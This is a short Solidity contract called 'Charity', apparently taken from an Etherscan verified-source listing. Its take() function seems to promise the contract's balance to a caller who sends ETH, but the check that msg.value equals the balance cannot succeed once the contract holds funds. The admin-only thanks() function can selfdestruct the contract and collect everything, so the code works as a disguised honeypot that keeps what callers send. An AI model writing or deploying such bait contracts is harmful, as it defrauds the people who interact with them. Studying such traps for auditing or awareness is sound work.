/**
 *Submitted for verification at Etherscan.io on 2020-06-14
*/

pragma solidity ^0.6.0;

contract Charity {

	address payable admin;

	constructor() public payable {
		admin = msg.sender;
	}

	function take() public payable {
		require(msg.sender == tx.origin);

		if (msg.value == address(this).balance) {
			msg.sender.transfer(address(this).balance);
		}
	}

	function thanks() public {
		require(msg.sender == admin);
		selfdestruct(admin);
	}

	receive() external payable {
		// Donations
	}
}